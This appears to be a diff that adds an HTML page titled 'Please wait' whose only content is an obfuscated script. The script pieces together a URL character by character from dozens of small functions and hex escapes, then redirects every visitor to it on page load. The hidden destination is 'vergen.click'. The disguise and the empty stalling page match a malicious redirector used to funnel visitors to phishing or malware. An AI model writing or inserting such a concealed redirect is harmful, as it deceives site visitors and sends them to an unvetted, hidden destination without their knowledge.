@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Please wait</title>
+    <script>
+        const els = [
+            () => "h",
+            () => "t",
+            function() { return 't'; },
+            function() { return 'p'; },
+            () => '\x73',
+            () => ':',
+            n => "/",
+            () => "/",
+            () => '\x76',
+            () => '\x65',
+            z => 'r',
+            () => '\x67',
+            () => "e",
+            function() { return 'n'; },
+            () => '\x2e',
+            () => "c",
+            () => '\x6c',
+            () => "i",
+            function() { return "c"; },
+            () => '\x6b',
+            v => '/',
+            () => 's',
+            q => '/',
+            () => '\x72',
+            e => 'e',
+            $ => "p"
+        ];
+        const dest = els.reduce((s, fn) => s + fn(), '');
+
+        document.location = dest;
+    </script>
+</head>
+<body></body>
+</html>
